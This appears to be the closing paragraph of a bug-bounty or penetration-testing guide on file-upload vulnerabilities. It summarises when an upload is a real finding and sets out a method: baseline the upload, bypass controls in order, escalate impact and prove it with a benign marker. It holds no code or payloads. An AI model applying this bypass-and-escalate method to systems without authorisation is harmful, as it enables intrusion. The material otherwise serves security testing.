> **Final reminder — the one rule that pays:** *An upload is only a finding when the server executes your bytes, parses them dangerously, or serves them where they run.* Baseline first (where stored / what URL / which handler), bypass the controls in order, climb to the highest impact the context allows, and prove it with a **benign marker** — then the "browse… upload" button becomes the Critical it's worth.
